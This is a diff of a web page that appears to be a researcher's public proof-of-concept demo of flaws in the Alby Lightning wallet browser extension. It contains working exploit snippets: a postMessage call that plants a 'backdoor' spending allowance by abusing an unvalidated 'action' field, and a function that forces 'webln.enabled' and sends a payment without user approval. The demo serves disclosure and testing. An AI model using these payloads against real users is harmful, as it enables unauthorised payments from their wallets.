@@ -72,7 +72,7 @@
             // If action is defined, it is prioritized in the code later, but only type is checked for safety
             // So action can be anything, it is not validated
             action: "addAllowance",
-            type: "sendPaymentOrPrompt",
+            type: "enable",
             args: {
               totalBudget: 100,
               host: "aarondewes.github.io",
@@ -144,7 +144,7 @@ async function sendUsingPostMsg170() {
 }</pre>
         </div>
       </section>
-      <section class="container" style="margin-bottom: 0;">
+      <section class="container">
         <hgroup>
           <h3>Vulnerabilities in Alby 1.8.0 and below</h2>
             <h4>These should create a simple payment dialog in recent versions or do nothing, depending on how much will
@@ -171,16 +171,9 @@ async function sendUsingPostMsg180() {
     "*"
   );
 }</pre>
-          <button onclick="bypassEnableSend();">Ask for payment without calling webLn.enable</button>
+          <button onclick="setupBackdoor();">Place a "backdoor" allowance</button>
           <a href="#" role="button" class="outline" style="display: inline;" onclick="document.getElementById('code4').classList.toggle('display');return false;">i</a>
 <pre style="width: 100%; margin-bottom: 1rem; padding-top: 1rem; padding-bottom: 1rem;display:none;padding-left: 1rem;" id="code4">
-async function bypassEnableSend() {
-  window.webln.enabled = true;
-  await window.webln.sendPayment(await getInvoice(1000));
-}</pre>
-          <button onclick="setupBackdoor();">Place a "backdoor" allowance</button>
-          <a href="#" role="button" class="outline" style="display: inline;" onclick="document.getElementById('code5').classList.toggle('display');return false;">i</a>
-<pre style="width: 100%; margin-bottom: 1rem; padding-top: 1rem; padding-bottom: 1rem;display:none;padding-left: 1rem;" id="code5">
 async function setupBackdoor() {
   // Add if non-existent
   window.postMessage(
@@ -190,7 +183,7 @@ async function setupBackdoor() {
       // If action is defined, it is prioritized in the code later, but only type is checked for safety
       // So action can be anything, it is not validated
       action: "addAllowance",
-      type: "sendPaymentOrPrompt",
+      type: "enable",
       args: {
         totalBudget: 100,
         host: "aarondewes.github.io",
@@ -219,6 +212,18 @@ async function setupBackdoor() {
 }</pre>
         </div>
       </section>
+      
+      <section class="container" style="margin-bottom: 0;">
+        <hgroup>
+          <h3>Vulnerabilities in Alby 1.9.0 and below</h2>
+        </hgroup>
+          <button onclick="bypassEnableSend();">Ask for payment without calling webLn.enable</button>
+          <a href="#" role="button" class="outline" style="display: inline;" onclick="document.getElementById('code5').classList.toggle('display');return false;">i</a>
+<pre style="width: 100%; margin-bottom: 1rem; padding-top: 1rem; padding-bottom: 1rem;display:none;padding-left: 1rem;" id="code5">
+async function bypassEnableSend() {
+  window.webln.enabled = true;
+  await window.webln.sendPayment(await getInvoice(1000));
+}</pre>
     </main>
     <footer class="container">
       Developed by <a href="https://twitter.com/AaronDewes">@AaronDewes</a>
